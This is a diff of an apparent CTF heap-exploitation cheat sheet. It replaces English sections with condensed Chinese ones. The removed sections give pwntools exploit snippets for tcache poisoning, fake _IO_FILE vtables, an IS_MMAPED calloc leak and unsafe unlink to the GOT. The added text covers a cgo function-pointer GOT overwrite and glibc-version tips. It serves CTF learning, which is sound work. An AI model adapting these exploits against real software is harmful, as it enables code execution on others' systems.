-**Key insight:** tcache bypasses most pre-2.27 consolidation tricks, but the `strcpy` null-byte overflow remains viable because it acts on the *next chunk's header*, not the current chunk's in-use flag. Combined with careful zeroing of glibc 2.26+ memset residue (the `0xda` pattern glibc uses on free), you can re-use classic off-by-one-null techniques even in a tcache world. The magic sizes are: large enough to skip the tcache (>0x408 for the freed chunk), small enough to land next to the overflow target.
+**指针值就是参数**，不需要另找可控字符串。
 
-**References:** HITCON CTF 2018 — Children Tcache, writeup 11929
+## 22. cgo 二进制里的 C 结构体
 
----
-
-## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)
-
-**Pattern:** Go binary compiled with `cgo` places a name buffer immediately adjacent to a struct whose first field is a function pointer (C-style vtable). Overflowing the name field corrupts the next struct's function pointer. First overwrite → redirect the call to `puts(got['free'])` to leak libc. Second overwrite → point free's GOT entry at `system`, then free a chunk whose contents are `"/bin/sh"`.
+Go 服务用 cgo 时，Go 分配的缓冲区常紧挨着 C 风格结构体（首字段是函数指针）。名字字段溢出就能改到函数指针：
 
 ```python
-# 1. Leak libc
+# 1. 泄 libc
 payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
-io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))
-
-# 2. Overwrite free@GOT with system
-libc_base = libc - libc_syms['puts']
-io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))
-
-# 3. Free a chunk whose contents are "/bin/sh\x00"
-io.sendline('/bin/sh')
-io.sendline('delete 0')
+# 2. 改 free@GOT 为 system
+payload = b'A'*name_size + p64(libc_base + libc_syms['system'])
+# 3. free 一个内容是 "/bin/sh" 的块
 ```
 
-**Key insight:** cgo binaries often have C-style structs next to Go-allocated buffers, so classic C-heap techniques still work against Go servers. Look for `GoString` + `char*` + function pointer patterns in the decompile; the layout is usually deterministic.
+反编译里找 `GoString` + `char*` + 函数指针的排列，布局通常确定。
 
-**References:** RITSEC CTF 2018 — Yet Another HR Management Framework, writeups 12283, 12287
+## 23. 纪律
 
----
-
-## Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)
-
-**Pattern:** The visible menu caps allocations at a few chunks, but disassembly reveals an undocumented option (`1337`) that calls `malloc` and `edit` without updating the counter — effectively giving you unlimited allocations. Combined with a vanilla tcache UAF, this lets you flood the tcache, overwrite an entry's `fd` with a BSS target, and `malloc` arbitrary addresses.
-
-```python
-def hidden(sz, data):
-    p.sendlineafter(b'>', b'1337')
-    p.sendlineafter(b'size:', str(sz).encode())
-    p.sendafter(b'data:', data)
-
-free(0); free(1)
-hidden(0x20, p64(bss_target))   # tcache fd → bss_target
-_ = malloc(0x20)                # first chunk back
-shell = malloc(0x20)            # returns bss_target
-```
-
-**Key insight:** Always dump the menu parser for undocumented branches before assuming a challenge is "rate-limited". Numeric options like `1337`, `9999`, `0xdead` are classic bypasses that the author ships to debug the challenge.
-
-**References:** FireShell CTF 2019 — babyheap, writeup 12962
-
----
-
-## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)
-
-**Pattern:** Small allocation budget, fastbin + tcache available. Double-free a fastbin chunk into the tcache, malloc to obtain a tcache entry that points at `_IO_2_1_stdout_`, then overwrite stdout's `vtable` pointer to a fake jump table where `_IO_file_overflow` → `system`. Next printf call executes `system("/bin/sh")`.
-
-```python
-# 1. Free A twice (bypasses fastbin double-free via tcache)
-free(A); free(A)
-# 2. Malloc returns A; write stdout addr as next fd
-edit(A, p64(stdout))
-# 3. Next malloc returns stdout
-malloc()
-malloc()  # returns &stdout
-edit(stdout, fake_file_struct(vtable=fake_vt))
-```
-
-Fake vtable entry: slot for `_IO_file_overflow = system`.
-
-**Key insight:** tcache skips fastbin safety checks, so a double-free directly into the tcache works without the usual size-field trickery. The resulting write-where primitive reaches `_IO_2_1_stdout_` in libc trivially.
-
-**References:** BCTF 2018 — easiest, writeup 12489
-
----
-
-## Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)
-
-**Pattern:** Only ~2 allocations available — too few for a traditional tcache dup. Instead, fill tcache, overflow into fastbin, craft chunk whose header points inside a known structure. When fastbin allocation promotes back into tcache (after a future free), malloc returns the header address.
-
-```python
-for _ in range(7): free(tcache_chunks[_])   # fill tcache bin
-free(fastbin_chunk)                         # goes to fastbin
-edit(fastbin_chunk, p64(target_hdr))        # poison fastbin fd
-# Drain tcache so next free of fastbin_chunk promotes:
-for _ in range(7): malloc(size)
-free(fastbin_chunk)                         # now lands in tcache
-malloc(size)                                 # returns tcache head = target_hdr
-```
-
-**Key insight:** tcache and fastbin share size classes at certain boundaries; a chunk that starts in one often migrates to the other. Use that promotion as an additional reallocation step when budget is tight.
-
-**References:** BCTF 2018 — three/houseofatum, writeups 12476, 12477
-
----
-
-## 6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)
-
-**Pattern (archiver):** C++ compressor keeps a 48-element QWORD cache (`cached_qwords[48]`) but the cache-read/write opcodes accept a 6-bit index (0-63), giving OOB access into the surrounding object (`buf`, `buf_size`, `buf_offset_Q`, `written_bytes`, `print_uncomp_fsz`). All operations are QWORD-aligned so you cannot directly slice a function pointer; instead, abuse the unused `written_bytes` counter as a programmable offset accumulator to turn `print_uncomp_fsz` into `cat_flag()`.
-
-```python
-# OOB write primitives (a2 in [0, 0x3f]):
-#   cache_qword(a2, k)            -> cached_qwords[a2] = buf[buf_off_Q - k]
-#   save_cached_qword_to_comp(a2) -> buf[++off] = cached_qwords[a2]; written_bytes += 8
-
-# 1. Preallocate buf so it is not realloc'd later (avoids data loss).
-# 2. Save print_uncomp_fsz into buf via OOB save_cached_qword_to_comp(0x34).
-# 3. Move it back into written_bytes via OOB cache_qword(0x33, 1).
-# 4. Emit 0x38 cached QWORDs -> written_bytes += 0x38*8 == 0x1c0 (offset to cat_flag).
-# 5. Save the now-incremented written_bytes into buf, then OOB write it back
-#    on top of print_uncomp_fsz. Trigger an error path so main() calls it.
-payload += save_cached_qword_to_comp(0x34)       # fn ptr -> buf
-payload += cache_qword(0x33, 1)                  # buf -> written_bytes
-payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x1c0
-payload += save_cached_qword_to_comp(0x33)       # written_bytes -> buf
-payload += cache_qword(0x34, 1)                  # buf -> print_uncomp_fsz
-```
-
-**Key insight:** When OOB writes are QWORD-aligned but the target function sits only `N*0x10` bytes from an existing pointer, look for a process-local counter in the same struct that is incremented by a known stride. Treating that counter as an arithmetic shim turns an aligned-write primitive into a byte-precise pointer increment, bypassing PIE without ever leaking a code address.
-
-**References:** Codegate CTF 2019 Preliminary — archiver, writeup 13014
-
----
-
-## IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)
-
-**Pattern (BabyHeap2017):** Heap overflow in a full-mitigation binary (Full RELRO, canary, NX, PIE, ASLR). `calloc` normally zeroes freshly-allocated chunks, blocking the classic unsorted-bin leak where fd/bk overlap reusable data. However, when the chunk's `IS_MMAPED` flag is set, glibc skips zeroing. Overflow the preceding chunk to flip `IS_MMAPED` on a freed unsorted-bin chunk, then re-allocate it with `calloc` — the arena pointers in fd/bk survive and leak libc.
-
-```python
-# Layout: A (0x80) | B (0x80 freed -> unsorted) | C (victim with overflow)
-# Overflow from A into B's chunk header: set size |= IS_MMAPED (bit 1 of size field)
-edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))    # prev_size=0, size=0x91|IS_MMAPED
-
-# calloc-reallocate B: because IS_MMAPED is set, calloc does NOT memset it.
-# B's fd/bk still point to main_arena + 0x58 -> libc leak via view(B).
-malloc(0x80)                   # returns B with libc pointer intact in first 16 bytes
-libc_base = leak - main_arena_offset
-
-# Follow-up: fastbin dup -> __malloc_hook -> one_gadget
-```
-
-**Key insight:** `calloc`'s zeroing is conditional on the allocator path. Setting `IS_MMAPED` via heap overflow tricks `calloc` into treating the reused chunk as freshly mmap'd and skipping `memset`, preserving any arena pointers previously written into fd/bk. A 2-bit metadata overwrite defeats the "calloc blocks leaks" assumption.
-
-**References:** 0CTF 2017 Quals — babyheap, writeup 13262
-
----
-
-## Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)
-
-**Pattern (straw_clutcher):** File-server heap has a `RENAME` handler that length-checks `old_name` twice instead of `old_name`/`new_name`, giving a bounded heap overflow into the adjacent `file_t` (`filename[0x20]`, `file_size`, `data`, `free_option`, `prev_file`). Every filename must match `[A-Za-z0-9]+.[A-Za-z0-9]{3}`, which rules out full fastbin-fd overwrites — but the regex only sees the **first null-terminated string** stored in `filename`, so the bytes after a preserved null are unconstrained. Corrupt only the LSB of `prev_file` so it re-points to `file->data` (attacker-controlled), forging a fake chunk that enables double-free + fastbin attack on `__malloc_hook`.
-
-```python
-# 1. Leak libc/heap by overwriting file_size to huge value, then RETR dumps the heap.
-# 2. Create file whose data bytes satisfy regex as a fake file_t chunk header.
-pc.sendline('PUT EEE.EXE {}'.format(0x48))
-pc.send(p64(0x4848482e484848) + p64(0)*4       # fake filename "HHH.HHH"
-        + p64(0x68)                             # fake file_size
-        + p64(heap + 0x250) + p64(0)            # fake data
-        + p64(heap + 0x190))                    # fake prev_file
-# 3. Produce two 0x70 freed chunks, then overwrite LSB of file->prev_file via rename:
-pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')
-# Only LSB of prev_file changes -> upper bytes preserved, LSB lands inside data.
-# 4. DELE the forged entry -> double-free on 0x70 tcache/fastbin.
-# 5. Classic fastbin poison onto __malloc_hook - 0x23, then trigger with PUT.
-```
-
-**Key insight:** When an overflow is byte-addressable but must pass a character-class filter, target only the LSB of heap-metadata pointers. Heap addresses share upper bytes across chunks, so a single attacker-controlled LSB relocates a pointer inside the same 256-byte window — enough to land it in a buffer you already control, bypassing regex/charset constraints that would reject a full 8-byte overwrite.
-
-**References:** BSidesSF 2019 — straw_clutcher, writeup 13763
-
----
-
-## Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)
-
-**Pattern:** Non-glibc allocator with naive `free` — sets `mem[fd] = bk` (and symmetric `mem[bk+4] = fd`) without any safe-unlink consistency check. Overflow from the 10th chunk (0x104 bytes) corrupts chunk 11's `fd`/`bk` so that when chunk 9 is freed and chunk 11 becomes its "neighbour" during consolidation, the unlink writes `printf@GOT` → shellcode jump.
-
-```python
-from pwn import *
-context(arch='i386', os='linux')
-
-printf_got = 0x804c004
-array_10_addr = 0x...   # leaked from banner output "loc=0xADDR"
-
-payload  = p32(printf_got - 8)       # fake fd -> target = printf GOT (minus 8 for offset)
-payload += p32(array_10_addr + 8)    # fake bk -> value = addr of shellcode jump
-payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; pad; shellcode
-payload += b"A" * (260 - len(payload))
-payload += p32(0)                    # next chunk's size field (prev_in_use = 0)
-```
-
-**Key insight:** Custom allocators almost never implement glibc's `fd->bk == chunk && bk->fd == chunk` safe-unlink check introduced in 2004. The classic `write-what-where` via `unlink(chunk)` applies verbatim — target GOT entries that will be called soon (printf, free, puts) and bake a short `jmp +8` over the 8-byte write slot into the shellcode. Validate the faked `size` field of the sentinel chunk so the allocator still consolidates instead of aborting.
-
-**References:** DEF CON CTF Qualifier 2014 — heap, writeup 13953
+- **先 `strings libc.so.6 | grep GLIBC` 定版本**。2.26/2.29/2.32/2.34/2.39 每一档都换一套手法，猜错版本整套白做。
+- **先数 tcache count**。2.39 下 count 满 7 时 `free()` 根本不进 tcache，你的 poisoning 会静默失效。
+- **2.32+ 写 tcache `fd` 必须混淆**（`ptr ^ (chunk >> 12)`）。不混淆的表现是「返回了个离谱地址然后崩」，不是「没生效」。
+- **house 系列的选择由「原语能改到谁的元数据」决定**，不是由题目名决定：能改 top 就 Force/Orange，能改 freed 块的 fd 就 poisoning，能改 smallbin 的 bk 就 Lore/stashing，能改 largebin 的 nextsize 就 largebin attack。
+- **2.34+ 不要再想 hook**。只有 FSOP（Apple 2）或返回地址两条路。
+- **报的是「哪个 bin 的哪个指针被校验拦了」**，不是「堆打不通」。`unlink_chunk` abort 是 fd/bk 检查，`sysmalloc` abort 是 top 条件不满足，`malloc_printerr` 是 size/对齐问题——每条指向不同的构造错误。
